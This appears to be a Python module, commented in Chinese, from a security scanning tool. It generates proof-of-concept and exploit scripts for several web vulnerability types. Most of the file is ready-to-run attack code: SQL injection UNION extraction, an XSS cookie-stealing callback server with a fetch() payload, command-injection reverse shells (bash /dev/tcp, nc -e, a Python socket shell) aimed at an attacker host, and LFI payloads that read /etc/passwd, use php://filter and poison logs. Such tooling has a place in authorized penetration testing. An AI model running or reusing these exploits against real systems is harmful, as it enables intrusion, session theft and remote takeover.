"""
security/oob_detector.py - 带外检测(OOB)与利用代码生成器

核心能力：
- DNS回调检测（验证盲SSRF、盲XXE、盲命令注入）
- HTTP回调检测（验证盲漏洞）
- 利用代码生成器（根据漏洞类型生成PoC/Exploit）
- 支持SQL注入、XSS、命令注入、SSRF、目录遍历、文件上传等漏洞类型
"""
import os
import re
import sys
import json
import time
import uuid
import socket
import threading
import urllib.parse
import urllib.request
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict


# ================================================================
# 数据结构
# ================================================================
from .oob_channel_type import *  # noqa: F401,F403
from .core import *  # noqa: F401,F403

class ExploitGeneratorPart1(object):
    def __init__(self, default_language: str = "python"):
        self.default_language = default_language
        self.templates = self._init_templates()
    def _init_templates(self) -> Dict[str, Dict]:
        """初始化利用代码模板"""
        return {
            "sql_injection": {
                "poc": self._sqli_poc_template,
                "exploit": self._sqli_exploit_template,
            },
            "xss": {
                "poc": self._xss_poc_template,
                "exploit": self._xss_exploit_template,
            },
            "command_injection": {
                "poc": self._cmdi_poc_template,
                "exploit": self._cmdi_exploit_template,
            },
            "directory_traversal": {
                "poc": self._lfi_poc_template,
                "exploit": self._lfi_exploit_template,
            },
            "ssrf": {
                "poc": self._ssrf_poc_template,
                "exploit": self._ssrf_exploit_template,
            },
            "ssti": {
                "poc": self._ssti_poc_template,
                "exploit": self._ssti_exploit_template,
            },
            "open_redirect": {
                "poc": self._redirect_poc_template,
                "exploit": self._redirect_exploit_template,
            },
            "file_upload": {
                "poc": self._upload_poc_template,
                "exploit": self._upload_exploit_template,
            },
        }
    def generate(self, vulnerability: Dict, exploit_type: str = "poc",
                 language: str = "") -> Optional[Exploit]:
        """生成利用代码"""
        vuln_type = vulnerability.get("vuln_type", "")
        if vuln_type not in self.templates:
            return None

        template_fn = self.templates[vuln_type].get(exploit_type)
        if not template_fn:
            template_fn = self.templates[vuln_type].get("poc")
        if not template_fn:
            return None

        code, description, requirements, usage = template_fn(vulnerability)

        return Exploit(
            vuln_type=vuln_type,
            target=vulnerability.get("url", vulnerability.get("file_path", "")),
            language=language or self.default_language,
            exploit_type=exploit_type,
            code=code,
            description=description,
            requirements=requirements,
            usage=usage,
            severity=vulnerability.get("severity", "medium"),
        )
    def generate_batch(self, vulnerabilities: List[Dict], exploit_type: str = "poc") -> List[Exploit]:
        """批量生成利用代码"""
        exploits = []
        for vuln in vulnerabilities:
            exploit = self.generate(vuln, exploit_type)
            if exploit:
                exploits.append(exploit)
        return exploits
    def _sqli_poc_template(self, vuln: Dict) -> Tuple[str, str, List[str], str]:
        url = vuln.get("url", "http://target.com/page")
        param = vuln.get("injection_point", {}).get("name", "id")
        payload = vuln.get("payload", "' OR '1'='1")
        code = f'''#!/usr/bin/env python3
"""SQL注入PoC - {url}"""
import requests
import sys

url = "{url}"
param = "{param}"
payload = "{payload}"

def test():
    print(f"[*] 测试SQL注入: {{url}}?{{param}}={{payload}}")
    # 布尔真测试
    params_true = {{param: payload}}
    resp_true = requests.get(url, params=params_true, timeout=10)
    # 布尔假测试
    params_false = {{param: payload.replace("1", "2")}}
    resp_false = requests.get(url, params=params_false, timeout=10)

    print(f"[+] 真payload响应长度: {{len(resp_true.text)}}")
    print(f"[+] 假payload响应长度: {{len(resp_false.text)}}")

    if abs(len(resp_true.text) - len(resp_false.text)) > 100:
        print("[+] 确认存在SQL注入漏洞!")
        print(f"[+] Payload: {{payload}}")
        return True
    else:
        print("[-] 未确认SQL注入")
        return False

if __name__ == "__main__":
    test()
'''
        return code, f"SQL注入PoC - {url}", ["requests"], "python3 sqli_poc.py"
    def _sqli_exploit_template(self, vuln: Dict) -> Tuple[str, str, List[str], str]:
        url = vuln.get("url", "http://target.com/page")
        param = vuln.get("injection_point", {}).get("name", "id")
        code = f'''#!/usr/bin/env python3
"""SQL注入利用 - UNION注入数据提取"""
import requests
import sys

url = "{url}"
param = "{param}"

def get_columns():
    """获取列数"""
    for i in range(1, 20):
        payload = f"1 ORDER BY {{i}}--"
        resp = requests.get(url, params={{param: payload}}, timeout=10)
        if "error" in resp.text.lower() or resp.status_code == 500:
            return i - 1
    return 0

def extract_data(columns, table, columns_list):
    """提取数据"""
    col_str = ",".join(columns_list)
    payload = f"1 UNION SELECT {{col_str}} FROM {{table}}--"
    resp = requests.get(url, params={{param: payload}}, timeout=10)
    return resp.text

def main():
    print("[*] SQL注入利用工具")
    cols = get_columns()
    print(f"[+] 列数: {{cols}}")

    if cols >= 2:
        print("[*] 尝试提取数据库版本...")
        payload = f"1 UNION SELECT 1,@@version--"
        resp = requests.get(url, params={{param: payload}}, timeout=10)
        print(f"[+] 响应: {{resp.text[:500]}}")

if __name__ == "__main__":
    main()
'''
        return code, f"SQL注入利用 - 数据提取", ["requests"], "python3 sqli_exploit.py"
    def _xss_poc_template(self, vuln: Dict) -> Tuple[str, str, List[str], str]:
        url = vuln.get("url", "http://target.com/page")
        param = vuln.get("injection_point", {}).get("name", "q")
        payload = vuln.get("payload", "<script>alert(1)</script>")
        code = f'''#!/usr/bin/env python3
"""XSS PoC - {url}"""
import requests
import sys
from urllib.parse import quote

url = "{url}"
param = "{param}"
payload = "{payload}"

def test():
    print(f"[*] 测试XSS: {{url}}?{{param}}={{payload}}")
    resp = requests.get(url, params={{param: payload}}, timeout=10)

    if payload in resp.text:
        print("[+] Payload原样反射，可能存在XSS!")
        print(f"[+] PoC URL: {{url}}?{{param}}={{quote(payload)}}")
        return True
    else:
        # 检查部分反射
        if "<script>" in resp.text or "alert(" in resp.text:
            print("[+] 检测到部分反射，可能存在过滤绕过")
            return True
        print("[-] 未检测到XSS")
        return False

if __name__ == "__main__":
    test()
'''
        return code, f"XSS PoC - {url}", ["requests"], "python3 xss_poc.py"
    def _xss_exploit_template(self, vuln: Dict) -> Tuple[str, str, List[str], str]:
        code = '''#!/usr/bin/env python3
"""XSS利用 - Cookie窃取和会话劫持"""
import http.server
import urllib.parse
import sys

class CookieHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        if "c" in params:
            print(f"[+] 窃取到Cookie: {params['c'][0]}")
            with open("stolen_cookies.txt", "a") as f:
                f.write(f"{self.client_address[0]}: {params['c'][0]}\\n")
        self.send_response(200)
        self.end_headers()

def generate_payload(callback_url):
    return f"<script>fetch('{callback_url}?c='+document.cookie)</script>"

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    print(f"[*] XSS Cookie窃取服务器启动在端口 {port}")
    print(f"[*] Payload: {generate_payload(f'http://localhost:{port}')}")
    server = http.server.HTTPServer(("0.0.0.0", port), CookieHandler)
    server.serve_forever()
'''
        return code, "XSS利用 - Cookie窃取", [], "python3 xss_exploit.py 8080"
    def _cmdi_poc_template(self, vuln: Dict) -> Tuple[str, str, List[str], str]:
        url = vuln.get("url", "http://target.com/page")
        param = vuln.get("injection_point", {}).get("name", "host")
        code = f'''#!/usr/bin/env python3
"""命令注入PoC - {url}"""
import requests

url = "{url}"
param = "{param}"

def test():
    print(f"[*] 测试命令注入: {{url}}")
    # 时间延迟测试
    payloads = [
        "; sleep 3",
        "| sleep 3",
        "&& sleep 3",
        "$(sleep 3)",
        "`sleep 3`",
    ]
    for payload in payloads:
        import time
        start = time.time()
        try:
            resp = requests.get(url, params={{param: payload}}, timeout=10)
            elapsed = time.time() - start
            if elapsed > 2.5:
                print(f"[+] 确认命令注入! Payload: {{payload}}")
                print(f"[+] 响应时间: {{elapsed:.1f}}s")
                return True
        except requests.exceptions.Timeout:
            print(f"[+] 确认命令注入(超时)! Payload: {{payload}}")
            return True
    print("[-] 未确认命令注入")
    return False

if __name__ == "__main__":
    test()
'''
        return code, f"命令注入PoC - {url}", ["requests"], "python3 cmdi_poc.py"
    def _cmdi_exploit_template(self, vuln: Dict) -> Tuple[str, str, List[str], str]:
        code = '''#!/usr/bin/env python3
"""命令注入利用 - 反向Shell"""
import requests
import sys

def generate_reverse_shell(ip, port):
    shells = [
        f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        f"nc -e /bin/sh {ip} {port}",
        f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"{ip}\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"])'",
    ]
    return shells

def exploit(url, param, ip, port):
    shells = generate_reverse_shell(ip, port)
    for shell in shells:
        for separator in [";", "|", "&&", "`", "$("]:
            if separator == "$(":
                payload = f"$({shell})"
            elif separator == "`":
                payload = f"`{shell}`"
            else:
                payload = f"{separator} {shell}"
            print(f"[*] 尝试: {payload[:50]}...")
            try:
                requests.get(url, params={param: payload}, timeout=5)
            except requests.exceptions.Timeout:
                pass
            except Exception:
                pass

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("用法: python3 cmdi_exploit.py <url> <param> <lhost> <lport>")
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4]))
'''
        return code, "命令注入利用 - 反向Shell", ["requests"], "python3 cmdi_exploit.py url param lhost lport"
    def _lfi_poc_template(self, vuln: Dict):
        url = vuln.get("url", "http://target.com/page")
        param = vuln.get("injection_point", {}).get("name", "file")
        code = f'''#!/usr/bin/env python3
"""目录遍历/LFI PoC - {url}"""
import requests

url = "{url}"
param = "{param}"

def test():
    payloads = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
    ]
    for payload in payloads:
        resp = requests.get(url, params={{param: payload}}, timeout=10)
        if "root:x:0:0" in resp.text:
            print(f"[+] 确认LFI! Payload: {{payload}}")
            print(f"[+] /etc/passwd内容:\\n{{resp.text[:500]}}")
            return True
    print("[-] 未确认LFI")
    return False

if __name__ == "__main__":
    test()
'''
        return code, f"LFI PoC - {url}", ["requests"], "python3 lfi_poc.py"
    def _lfi_exploit_template(self, vuln: Dict):
        code = '''#!/usr/bin/env python3
"""LFI利用 - 日志投毒和PHP Filter"""
import requests
import sys
import base64

def php_filter(url, param, file):
    payload = f"php://filter/convert.base64-encode/resource={file}"
    resp = requests.get(url, params={param: payload}, timeout=10)
    try:
        decoded = base64.b64decode(resp.text).decode("utf-8", errors="replace")
        return decoded
    except Exception:
        return resp.text

def log_poisoning(url, param, log_path, php_code):
    # 通过User-Agent注入PHP代码
    headers = {"User-Agent": f"<?php {php_code} ?>"}
    requests.get(url, headers=headers, timeout=10)
    # 包含日志文件
    resp = requests.get(url, params={param: log_path}, timeout=10)
    return resp.text

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("用法: python3 lfi_exploit.py <url> <param>")
        sys.exit(1)
    url, param = sys.argv[1], sys.argv[2]
    print("[*] 读取/etc/passwd:")
    print(php_filter(url, param, "/etc/passwd")[:500])
'''
        return code, "LFI利用 - PHP Filter和日志投毒", ["requests"], "python3 lfi_exploit.py url param"
